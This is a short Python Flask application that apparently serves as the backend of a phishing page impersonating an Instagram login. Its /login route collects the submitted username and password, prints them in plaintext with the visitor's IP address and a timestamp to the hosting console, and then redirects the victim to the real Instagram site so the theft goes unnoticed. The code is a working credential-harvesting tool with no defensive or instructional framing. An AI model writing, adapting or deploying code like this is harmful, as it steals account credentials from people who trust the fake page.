from flask import Flask, request, render_template, redirect
import os
from datetime import datetime

app = Flask(__name__, template_folder='templates')

# Environment variables (set these in Render dashboard)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-fallback-key')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    
    # Log the credentials securely in Render's console
    print(f"\n⚠️ NEW LOGIN ATTEMPT ⚠️\n"
          f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
          f"Username: {username}\n"
          f"Password: {password}\n"
          f"IP Address: {request.remote_addr}\n"
          "--------------------------")
    
    # Redirect to Instagram (user won't see their info)
    return redirect("https://www.instagram.com")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
